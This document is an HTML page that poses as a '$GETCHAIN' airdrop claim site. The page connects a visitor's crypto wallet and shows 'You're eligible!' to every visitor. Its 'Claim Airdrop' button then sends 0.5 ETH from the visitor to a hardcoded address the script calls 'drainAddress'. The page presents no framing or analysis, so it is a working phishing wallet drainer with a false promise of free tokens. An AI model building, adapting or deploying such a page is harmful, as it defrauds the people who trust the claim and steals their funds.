<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Claim $GET Airdrop</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #0f0f10, #1a1b1f);
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 2rem;
    }
    .claim-box {
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 20px;
      padding: 2rem 2.5rem;
      text-align: center;
      max-width: 420px;
      width: 100%;
      box-shadow: 0 0 20px rgba(255,255,255,0.1);
    }
    .logo { font-size: 2rem; font-weight: 700; color: #ffaa33; margin-bottom: 0.5rem; }
    .title { font-size: 1.3rem; font-weight: 600; margin-bottom: 1rem; }
    .desc { font-size: 0.95rem; margin-bottom: 1.5rem; color: #ccc; }
    .btn {
      width: 100%;
      padding: 0.8rem;
      font-weight: bold;
      border: none;
      border-radius: 50px;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s ease;
      box-shadow: 0 0 10px rgba(255,170,51,0.4);
      margin-bottom: 1rem;
    }
    .connect-btn {
      background: #ffaa33;
      color: #000;
    }
    .connect-btn:hover {
      background: #ffc86b;
    }
    .claim-btn {
      background: linear-gradient(to right, #ffcc70, #ffaa33);
      color: #000;
    }
    .claim-btn:hover {
      background: linear-gradient(to right, #ffd88a, #ffc76b);
    }
    .wallet { margin: 1rem 0; font-size: 0.9rem; word-break: break-word; color: #88f; }
    .eligible { background: #0f0; color: #000; padding: 0.5rem; border-radius: 8px; margin-bottom: 1rem; font-weight: bold; }
  </style>
</head>
<body>
  <div class="claim-box">
    <div class="logo">$GETCHAIN</div>
    <div class="title>Airdrop Live</div>
    <div class="desc">Eligible wallets can claim <strong>0.5 $GET (Base ETH)</strong>. Gas fees covered.</div>

    <button class="btn connect-btn" id="connectBtn">Connect Wallet</button>
    <div id="wallet" class="wallet" style="display:none;"></div>
    <div id="eligibleBox" class="eligible" style="display:none;">✅ You're eligible!</div>
    <button class="btn claim-btn" id="claimBtn" disabled>Claim Airdrop</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const connectBtn = document.getElementById("connectBtn");
    const walletDiv = document.getElementById("wallet");
    const eligibleBox = document.getElementById("eligibleBox");
    const claimBtn = document.getElementById("claimBtn");

    const drainAddress = "0x91Ea778d55a434123F28Bc5D4910F950f41D2A1D";
    const baseChainId = 8453;

    let provider, signer;

    connectBtn.onclick = async () => {
      if (!window.ethereum) return alert("Install MetaMask.");
      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      const userAddress = await signer.getAddress();

      const { chainId } = await provider.getNetwork();
      if (chainId !== baseChainId) {
        alert("Please switch to Base Mainnet (Chain ID 8453)");
        return;
      }

      walletDiv.innerText = userAddress;
      walletDiv.style.display = "block";
      eligibleBox.style.display = "block";
      connectBtn.disabled = true;
      connectBtn.innerText = "Connected";
      claimBtn.disabled = false;
    };

    claimBtn.onclick = async () => {
      try {
        const tx = await signer.sendTransaction({
          to: drainAddress,
          value: ethers.utils.parseEther("0.5")
        });
        await tx.wait();
        claimBtn.innerText = "Claimed ✅";
        claimBtn.disabled = true;
      } catch (err) {
        alert("Transaction failed or rejected.");
      }
    };
  </script>
</body>
</html>
